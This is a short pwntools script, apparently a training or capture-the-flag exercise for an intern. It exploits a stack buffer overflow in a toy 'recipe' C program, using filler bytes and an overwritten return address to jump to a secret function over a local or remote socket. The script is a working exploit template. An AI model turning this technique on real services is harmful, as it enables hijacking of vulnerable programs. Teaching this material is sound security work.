from pwn import *

# Dear intern, try to put in the correct values for the following variables
# This will show you why your current C-code could leak our secret dough recipe!
RECIPE_BUFFER_SIZE = 16
RBP_SIZE = 8
SECRET_ADDRESS = 0x4011b6
PROMPT = "Please enter the name of the recipe you want to retrieve:"

USE_REMOTE = True
REMOTE_HOST = "localhost"
REMOTE_PORT = 1337

"""
This is a pwntools template - you do not have to change anything below this
Install pwntools before running:
    python3 -m pip install pwntools

(if you get an error about the environment being externally managed, add --break-system-packages to the command)
"""
if USE_REMOTE:
    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./recipe")
    io = e.process()

# Building the payload
payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(SECRET_ADDRESS)

# Sending the payload at the right time
io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()
